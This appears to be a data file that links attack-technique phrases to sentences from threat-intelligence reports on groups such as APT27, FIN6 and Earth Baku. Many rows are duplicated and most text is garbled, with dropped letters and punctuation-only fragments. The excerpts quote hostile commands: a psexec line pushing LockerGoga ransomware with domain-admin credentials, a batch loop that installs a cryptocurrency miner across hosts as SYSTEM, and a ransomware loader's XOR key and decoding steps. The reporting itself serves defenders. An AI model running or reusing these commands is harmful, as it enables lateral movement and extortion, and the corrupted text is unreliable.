6676698d65e372feb79c0159d9d2b11e,"exe└──cmd.exe: C:\Windows\system32\cmd.exe /c """"rdp.bat""",0.805354720058993,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
d8bfe2d6295d697f296644658fd284a8,or Windows Scripting,0.785059926480695,"['.w.i.', 'exemail.net pic.glkjcorp.com yahomail.adobeus.com 020 6C 0 6C 0 20 0 6E 0 6F 0 74 0 20 0 6 0 l.l.', '.n.o.t.', '.f.', 'flash.adobeus.com pic.hkabinc.com ygfk.sfcorporation.com 0230 75 0 6E 0 63 0 74 0 69 0 6F 0 6E 0 20 0 u.n.c.t.i.o.n.', '.', 'fngs.adobeus.com pics.adobeus.com yhkj.sfcorporation.com 0240 70 0 72 0 6F 0 70 0 65 0 72 0 6C 0 79 0 p.r.o.p.e.r.l.y.', 'fsw.adobeus.com pics.amazonwikis.com yjbf.amazonwikis.com gde.moviestops.com projectscorp.net yjxy.sfcorporation.com 0250 2E 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 .', '.', 'ghlc.adobeus.com qsgs.sfcorporation.com yqby.wordoscorp.com -Truncated- glkjcorp.com rbjg.moviestops.com zdzl.sfcorporation.com 0380 0 0 0 0 43 0 72 0 79 0 70 0 74 0 50 0 .C.r.y.p.t.P.', 'gmnspace.com rbjg.moviestops.com ziper.imbs.in 0390 6F 0 6C 0 2E 0 64 0 6C 0 6C 0 0 0 0 0 o.l.d.l.l.']"
d8bfe2d6295d697f296644658fd284a8,or Windows Scripting,0.785059926480695,"['.w.i.', 'exemail.net pic.glkjcorp.com yahomail.adobeus.com 020 6C 0 6C 0 20 0 6E 0 6F 0 74 0 20 0 6 0 l.l.', '.n.o.t.', '.f.', 'flash.adobeus.com pic.hkabinc.com ygfk.sfcorporation.com 0230 75 0 6E 0 63 0 74 0 69 0 6F 0 6E 0 20 0 u.n.c.t.i.o.n.', '.', 'fngs.adobeus.com pics.adobeus.com yhkj.sfcorporation.com 0240 70 0 72 0 6F 0 70 0 65 0 72 0 6C 0 79 0 p.r.o.p.e.r.l.y.', 'fsw.adobeus.com pics.amazonwikis.com yjbf.amazonwikis.com gde.moviestops.com projectscorp.net yjxy.sfcorporation.com 0250 2E 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 .', '.', 'ghlc.adobeus.com qsgs.sfcorporation.com yqby.wordoscorp.com -Truncated- glkjcorp.com rbjg.moviestops.com zdzl.sfcorporation.com 0380 0 0 0 0 43 0 72 0 79 0 70 0 74 0 50 0 .C.r.y.p.t.P.', 'gmnspace.com rbjg.moviestops.com ziper.imbs.in 0390 6F 0 6C 0 2E 0 64 0 6C 0 6C 0 0 0 0 0 o.l.d.l.l.']"
da720a0b860cc8b213511d0e3c6beb1b,used to download files…,0.8584333500019319,"['After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.', 'Lower security setings by tampering with registry keys.', 'Inject content into the lsas.exe proces, in order to load the keyloger module into lsas and cal its exported function.']"
da720a0b860cc8b213511d0e3c6beb1b,used to download files…,0.8584333500019319,"['After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.', 'Lower security setings by tampering with registry keys.', 'Inject content into the lsas.exe proces, in order to load the keyloger module into lsas and cal its exported function.']"
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,[]
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,[]
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,"['.', '.', '.', '.', '.', '1 The Bat!', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,"['.', '.', '.', '.', '.', '1 The Bat!', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,"['.', '.', '.', '.', '.', '5 The Bat!', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,"['.', '.', '.', '.', '.', '5 The Bat!', '.', '.', '.', '.', '.']"
d3d11f0faf194266cc86ec9f1af4162d,""".bat"" files",0.755040711744637,"['The Mandiant investigation revealed that the atacker was in the early stages of a deploying LockerGoga.', 'Using domain administrator credentials, the atacker ran batch files containing psexec comands to conect to remote systems and deploy LockerGoga.', 'The batch scripts (Fig.', '1) executed LockerGoga as the service mstdc, which was likely the atackers atempt to masquerade as the legitimate Windows service msdtc.', 'The batch files used by Figure 1. the atacker folowed the naming convention xa.bat, xab.bat, xac.bat and Strings from so on.', 'deployment BAT files.', 'start copy svchost.exe \\10.1.1.1\\c$\\windows\\temp\\start psexec.exe \\10.1.1.1 -u domain\\domainadmin -p pasword -d -h -r mstdc -s -acepteula -nobaner c:\\windows\\temp\\svchost.exe Mandiant analysts linked the tols and atacker infrastructure to other FIN6 activity, and eventualy concluded that FIN6 had expanded to using ransomware to further monetize their aces to compromised environments.', 'UNC173 In 2019, UNC173 targeted a retailer and tried to obtain payment card information from the point-of-sale (POS) environment.', 'The atacker gained aces to the environment by exploiting the CVE-2019-0604 vulnerability in a public-facing SharePoint server.', 'The exploit alowed the atacker to aces the system and launch a Cobalt Strike backdor.', 'After performing reconaisance and lateral movement, the atacker obtained domain administrator privileges by harvesting credentials from systems in the environment.']"
882f32a54783703ca615682148120e47,requests using RC4 encryption,0.7702121578120216,"['Substring in HTML file for search purposes 9 We also analyzed the payload encryption proces.', 'It consists of four stages: 1.', 'Key preparation (RC4KeyPrepare), with each byte XORed against a constant string.', '2.', 'Base64 encoding.', '3.', 'RC4 encryption.', '4.', 'ZLIB compresion.', 'In the downloader code, inside the entry for the RC4 key used for decryption, our ex- perts uncovered friendly wishes from the developers (se Figure 1).', 'Figure 1.']"
882f32a54783703ca615682148120e47,requests using RC4 encryption,0.7702121578120216,"['Substring in HTML file for search purposes 9 We also analyzed the payload encryption proces.', 'It consists of four stages: 1.', 'Key preparation (RC4KeyPrepare), with each byte XORed against a constant string.', '2.', 'Base64 encoding.', '3.', 'RC4 encryption.', '4.', 'ZLIB compresion.', 'In the downloader code, inside the entry for the RC4 key used for decryption, our ex- perts uncovered friendly wishes from the developers (se Figure 1).', 'Figure 1.']"
b5d067b705e3d7716dc5cd360e61cc7d,"decrypt,",1.0,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
6a3aafc1d433326193008dd2ebea3fbc,"kernel32.VirtualProtect,",0.7727579641446913,"['PC , .', '[ 1-1] \'CVE-202-4128\' 3InternetExplorer0-dayexploitedbyNorthKoreanactorAPT37 4[]\' 5"" Genians Security Center 3 Threat Inteligence Report 2.', '(Atack Scenario) 2.1.', '/ (Initial Aces / Infection Vectors) .', 'HWPX, HWP, LNK(XLSX ), DOCX , XLSX .', '.', ', .', '.', '2.2.', '(Spear Phishing Atachment) 7 .', ', HWPX .']"
ff6f1d18e04fd114b36c7b03e99afca4,obtained credentials for pivoting with Mimikatz,0.957377421981754,"[""What's more, the initial infection was of a foreign ofice of the client."", 'Then a subsequent breach of the head ofice back home.', ""We believe that the initial entry point to the foreign ofice's network was a vulnerable server on the network perimeter."", 'Exploitation in February 2018 enabled the atackers to gain initial aces and then persistence, with the help of the ChinaChoper and TwoFace web shels.', 'The atackers used NBTScan for network reconaisance and PsExec for lateral movement.', 'They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsas proces that had ben archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the atackers were forced to run bruteforcing ofline.', 'Another method was to scan hosts for so-caled Eternal* SMB vulnerabilities with SMBTouch and then, where posible, run the EternalBlue exploit and infect the computer.', 'On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdors were instaled for reliable persistence and aces.', 'One unexpected result of the compromise was cryptocurency mining at both the foreign ofice and headquarters.']"
ff6f1d18e04fd114b36c7b03e99afca4,obtained credentials for pivoting with Mimikatz,0.957377421981754,"[""What's more, the initial infection was of a foreign ofice of the client."", 'Then a subsequent breach of the head ofice back home.', ""We believe that the initial entry point to the foreign ofice's network was a vulnerable server on the network perimeter."", 'Exploitation in February 2018 enabled the atackers to gain initial aces and then persistence, with the help of the ChinaChoper and TwoFace web shels.', 'The atackers used NBTScan for network reconaisance and PsExec for lateral movement.', 'They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsas proces that had ben archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the atackers were forced to run bruteforcing ofline.', 'Another method was to scan hosts for so-caled Eternal* SMB vulnerabilities with SMBTouch and then, where posible, run the EternalBlue exploit and infect the computer.', 'On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdors were instaled for reliable persistence and aces.', 'One unexpected result of the compromise was cryptocurency mining at both the foreign ofice and headquarters.']"
ff6f1d18e04fd114b36c7b03e99afca4,encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64.,0.9266845386202396,"['However, this could also be a false flag.', '3.', 'Automation in 2018 and 2020 Here is the script used to automaticaly instal a cryptocurency miner on a list of computers in 2018: @echo of for /f %i in (c:\\programdata\\list.txt) do ( net use \\%i\\c$ ""*"" /u:*\\administrator copy c:\\programdata\\vmnat.exe \\%i\\c$\\windows\\system32\\vmnat.exe SCHTASKS /Create /S %i /u *\\administrator /p ""*"" /tn * /tr ""cmd.exe /c start c:\\windows\\system32\\vmnat.exe"" /sc onstart /RU SYSTEM schtasks /run /S %i /u *\\administrator /p ""*"" /tn * net use \\%i\\c$ /del net use * /del /Y ) del vmnat.exe del list.txt del work.bat And this is the script used to automaticaly delete the ransomware from a list of computers in 2020: @echo of for /f %i in (c:\\programdata\\list.txt) do ( net use \\%i\\c$ ""*"" /u:*\\* if not erorlevel 1 ( del \\%i\\c$\\programdata\\GameuxInstalHelper.dl del \\%i\\c$\\programdata\\GDFInstal.exe del \\%i\\c$\\programdata\\Sysurl.Hex net use \\%i\\c$ /del )ELSE ( echo not aces %i > c:\\programdata\\no_aces.txt ) ) (We replaced sensitive information with \'*\') htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 19/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The scripts show certain similarities in structure and have the same lop of file lines at the same path.', 'On the other hand, the indentation, script tasks, and file naming are diferent.', 'Some of the comands are to general to tel, since they could have ben found in online search results and reused.', '4.', 'Bodies of the SysUpdate and HyperBro backdors We were not able in some cases to confirm the presence of a given backdor based on the body of the Trojan itself.', 'We identified the HyperBro backdor, which had ben used in 2018, based on the distinctive file name combined with other confirmed tols.', 'We confirmed the SysUpdate backdor, used in 2020, by loking at the C2 adres and backdor body in the proces dump memory that had ben uploaded to VirusTotal during investigation from an organization not linked to our client.', 'Taken together, these similarities certainly point to APT27 as a culprit, but are not entirely conclusive.', 'Therefore we leave it to the reader to chose whether to concur regarding involvement by APT27.']"
ff6f1d18e04fd114b36c7b03e99afca4,encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64.,0.9266845386202396,"['However, this could also be a false flag.', '3.', 'Automation in 2018 and 2020 Here is the script used to automaticaly instal a cryptocurency miner on a list of computers in 2018: @echo of for /f %i in (c:\\programdata\\list.txt) do ( net use \\%i\\c$ ""*"" /u:*\\administrator copy c:\\programdata\\vmnat.exe \\%i\\c$\\windows\\system32\\vmnat.exe SCHTASKS /Create /S %i /u *\\administrator /p ""*"" /tn * /tr ""cmd.exe /c start c:\\windows\\system32\\vmnat.exe"" /sc onstart /RU SYSTEM schtasks /run /S %i /u *\\administrator /p ""*"" /tn * net use \\%i\\c$ /del net use * /del /Y ) del vmnat.exe del list.txt del work.bat And this is the script used to automaticaly delete the ransomware from a list of computers in 2020: @echo of for /f %i in (c:\\programdata\\list.txt) do ( net use \\%i\\c$ ""*"" /u:*\\* if not erorlevel 1 ( del \\%i\\c$\\programdata\\GameuxInstalHelper.dl del \\%i\\c$\\programdata\\GDFInstal.exe del \\%i\\c$\\programdata\\Sysurl.Hex net use \\%i\\c$ /del )ELSE ( echo not aces %i > c:\\programdata\\no_aces.txt ) ) (We replaced sensitive information with \'*\') htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 19/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The scripts show certain similarities in structure and have the same lop of file lines at the same path.', 'On the other hand, the indentation, script tasks, and file naming are diferent.', 'Some of the comands are to general to tel, since they could have ben found in online search results and reused.', '4.', 'Bodies of the SysUpdate and HyperBro backdors We were not able in some cases to confirm the presence of a given backdor based on the body of the Trojan itself.', 'We identified the HyperBro backdor, which had ben used in 2018, based on the distinctive file name combined with other confirmed tols.', 'We confirmed the SysUpdate backdor, used in 2020, by loking at the C2 adres and backdor body in the proces dump memory that had ben uploaded to VirusTotal during investigation from an organization not linked to our client.', 'Taken together, these similarities certainly point to APT27 as a culprit, but are not entirely conclusive.', 'Therefore we leave it to the reader to chose whether to concur regarding involvement by APT27.']"
11cc969841d2d32c5c9c90e4818e5e45,uploaded.,0.7550100025393772,"['Some gaming companies have already (storefronts, oficial video game content repositories) telemetry data, we can confirm that these two threats disruption conducted in 2023.', 'Our data sugests ben targeted by ransomware gangs: the most recent to the uncharted waters of torent sites and shady were stil quite active in H1 2024. that even though RedLine Stealer is no longer being high-profile ransomware atack ocured near the Discord servers ofering cracked games and cheating begining of H1 2024, when the company Insomniac tols.', 'These grey areas are exactly where criminals Games, developers best known for their two big- thrive the posibility of geting a game for fre, budget Spider-Man games, fel victim to a large-scale or of flawlesly executing headshots through wals data leak after refusing to pay ransom to the notorious in multiplayer shoters, constitute perfect bait for Rhysida ransomware group.', 'Sensitive data, ranging unsuspecting gamers.', 'What awaits the victims once from developers personal information to Insomniac hoked, are often infostealers that go after their Games roadmap of future game releases, was paswords, credit card data, or cryptowalets.', 'uploaded to the internet.', 'Infostealers-as-a-Service Even so, it is not only large busineses that are at risk; personal information of people who play video games Frequently, these atacks are conducted using is also an enticing target for cybercroks, as evidenced infostealers distributed as a service; both RedLine by threat actors hiding malware payloads in al sorts of Stealer and Luma Stealer, described in previous game-related files.', 'ESET Threat Reports, have ben found to be the RedLine Stealer daily detection trend in H1 2024 ESET THREAT REPORT Executive sumary Foreword Threat landscape trends Threat telemetry Research publications About this report About ESET H1 2024 | 17 updated, it is stil in use, though its mostly relegated to one-of campaigns Compromised mods In June 2023, hackers managed to compromise several acounts on isolated to one or two countries in 2024, its thre bigest data peaks Minecraft moding platforms and injected infostealing code into existing Gamers not inclined to pirate games or use cheats can stil come acros were registered on January 25 (50% of detections registered in Germany), projects.', 'More recently, in December 2023, a popular mod for the game Slay harmful files when downloading other video game-related asets.', 'As an April 24 (87% in Spain), and May 20 (91% in Japan).', 'However, these peaks the Spire was breached to push Epsilon Stealer (which ESET detects as the example, mods, or modifications for a video game made by the games were so significant that RedLine Stealer detections in H1 2024 have actualy JS/PSW.Agent trojan, variants .CH and .CI) via the Steam update system.']"
ff6f1d18e04fd114b36c7b03e99afca4,"scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer",0.7930854215142736,"['Exploitation in February 2018 enabled the atackers to gain initial aces and then persistence, with the help of the ChinaChoper and TwoFace web shels.', 'The atackers used NBTScan for network reconaisance and PsExec for lateral movement.', 'They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsas proces that had ben archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the atackers were forced to run bruteforcing ofline.', 'Another method was to scan hosts for so-caled Eternal* SMB vulnerabilities with SMBTouch and then, where posible, run the EternalBlue exploit and infect the computer.', 'On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdors were instaled for reliable persistence and aces.', 'One unexpected result of the compromise was cryptocurency mining at both the foreign ofice and headquarters.', 'Such activity remained unoticed for one and a half years.', 'During this time the atackers only maintained their aces abilities by periodicaly obtaining new acounts or building tunel chains.', 'Our belief is that by early 2020, the atackers had lost their aces (for reasons unknown to us).']"
ff6f1d18e04fd114b36c7b03e99afca4,"scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer",0.7930854215142736,"['Exploitation in February 2018 enabled the atackers to gain initial aces and then persistence, with the help of the ChinaChoper and TwoFace web shels.', 'The atackers used NBTScan for network reconaisance and PsExec for lateral movement.', 'They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsas proces that had ben archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the atackers were forced to run bruteforcing ofline.', 'Another method was to scan hosts for so-caled Eternal* SMB vulnerabilities with SMBTouch and then, where posible, run the EternalBlue exploit and infect the computer.', 'On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdors were instaled for reliable persistence and aces.', 'One unexpected result of the compromise was cryptocurency mining at both the foreign ofice and headquarters.', 'Such activity remained unoticed for one and a half years.', 'During this time the atackers only maintained their aces abilities by periodicaly obtaining new acounts or building tunel chains.', 'Our belief is that by early 2020, the atackers had lost their aces (for reasons unknown to us).']"
ff6f1d18e04fd114b36c7b03e99afca4,obtained the credentials of a domain administration at headquarters,0.7823913385666517,"['Such activity remained unoticed for one and a half years.', 'During this time the atackers only maintained their aces abilities by periodicaly obtaining new acounts or building tunel chains.', 'Our belief is that by early 2020, the atackers had lost their aces (for reasons unknown to us).', ""We can se use of web shels on the foreign ofice's servers on February 9, 2020."", 'Subsequent actions were very similar to what had hapened two years earlier.', 'By using the tols already described, the atackers obtained the credentials of a domain administration at headquarters.', 'This time, they deleted OS logs and stoped Shadow Copy services, complicating subsequent incident analysis.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 2/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction For the finale, on April 29, 2020, the acount of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.', 'While our specialists were asisting the client in May 2020, the atackers made yet another atempt to regain control of infrastructure with the help of web shels that were stil in place on the network of the headquarters and ofice, but this time to no suces.', 'Here we have provided a timeline to beter show the sequence of events.', ""htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 3/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 4/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 5/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 6/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 7/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction CSIRT's objectives included recovering the client's data, which included key information belonging to diferent departments.""]"
ff6f1d18e04fd114b36c7b03e99afca4,obtained the credentials of a domain administration at headquarters,0.7823913385666517,"['Such activity remained unoticed for one and a half years.', 'During this time the atackers only maintained their aces abilities by periodicaly obtaining new acounts or building tunel chains.', 'Our belief is that by early 2020, the atackers had lost their aces (for reasons unknown to us).', ""We can se use of web shels on the foreign ofice's servers on February 9, 2020."", 'Subsequent actions were very similar to what had hapened two years earlier.', 'By using the tols already described, the atackers obtained the credentials of a domain administration at headquarters.', 'This time, they deleted OS logs and stoped Shadow Copy services, complicating subsequent incident analysis.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 2/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction For the finale, on April 29, 2020, the acount of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.', 'While our specialists were asisting the client in May 2020, the atackers made yet another atempt to regain control of infrastructure with the help of web shels that were stil in place on the network of the headquarters and ofice, but this time to no suces.', 'Here we have provided a timeline to beter show the sequence of events.', ""htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 3/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 4/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 5/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 6/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 7/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction CSIRT's objectives included recovering the client's data, which included key information belonging to diferent departments.""]"
ff6f1d18e04fd114b36c7b03e99afca4,payload and intermediate library are deleted before completion,0.9960065555059817,"['GameuxInstalHelper.dl (MD5: 1fd840275d42e7389f0d28b9537db0f) is a .NET DL library (compiled on April 29, 2020) imported when GDFInstal.exe is run.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 8/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction This component is not actualy legitimate, however: atacker code is executed after the GameExplorerInstalW symbol is exported.', 'This frequently used technique of loading malicious code in the context of a legitimate aplication is known as DL hijacking.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 9/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The file c:\\programdata\\Sysurl.Hex is read (after being copied from c:\\windows\\system32\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFSDJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion ocurs in the standard (insecure) way, which enables recovering the data if disk aces is stoped in time and the information has not ben overwriten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.', 'This payload cal sequence (in which a legitimate aplication loads a malicious library, which in turn decrypts a third component and pases control to it) is very comonly used to run the PlugX backdor, which is widely sen among such Asian APT groups as APT10, APT41, htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 10/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction TA459, and Bronze Union.', ""Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834de241b) in greater detail."", 'Based on how GameuxInstalHelper.dl is launched, we quickly can gues that this file, to, is an executable file compiled with .NET.']"
ff6f1d18e04fd114b36c7b03e99afca4,payload and intermediate library are deleted before completion,0.9960065555059817,"['GameuxInstalHelper.dl (MD5: 1fd840275d42e7389f0d28b9537db0f) is a .NET DL library (compiled on April 29, 2020) imported when GDFInstal.exe is run.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 8/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction This component is not actualy legitimate, however: atacker code is executed after the GameExplorerInstalW symbol is exported.', 'This frequently used technique of loading malicious code in the context of a legitimate aplication is known as DL hijacking.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 9/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The file c:\\programdata\\Sysurl.Hex is read (after being copied from c:\\windows\\system32\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFSDJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion ocurs in the standard (insecure) way, which enables recovering the data if disk aces is stoped in time and the information has not ben overwriten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.', 'This payload cal sequence (in which a legitimate aplication loads a malicious library, which in turn decrypts a third component and pases control to it) is very comonly used to run the PlugX backdor, which is widely sen among such Asian APT groups as APT10, APT41, htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 10/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction TA459, and Bronze Union.', ""Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834de241b) in greater detail."", 'Based on how GameuxInstalHelper.dl is launched, we quickly can gues that this file, to, is an executable file compiled with .NET.']"
ff6f1d18e04fd114b36c7b03e99afca4,yielding a PE file that is loaded and run in memory with .NET.,0.8467561942284374,"[""Thre files are sent to the victim's computer: GDFInstal.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft."", 'GameuxInstalHelper.dl (MD5: 1fd840275d42e7389f0d28b9537db0f) is a .NET DL library (compiled on April 29, 2020) imported when GDFInstal.exe is run.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 8/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction This component is not actualy legitimate, however: atacker code is executed after the GameExplorerInstalW symbol is exported.', 'This frequently used technique of loading malicious code in the context of a legitimate aplication is known as DL hijacking.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 9/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The file c:\\programdata\\Sysurl.Hex is read (after being copied from c:\\windows\\system32\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFSDJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion ocurs in the standard (insecure) way, which enables recovering the data if disk aces is stoped in time and the information has not ben overwriten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.', 'This payload cal sequence (in which a legitimate aplication loads a malicious library, which in turn decrypts a third component and pases control to it) is very comonly used to run the PlugX backdor, which is widely sen among such Asian APT groups as APT10, APT41, htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 10/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction TA459, and Bronze Union.', ""Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834de241b) in greater detail.""]"
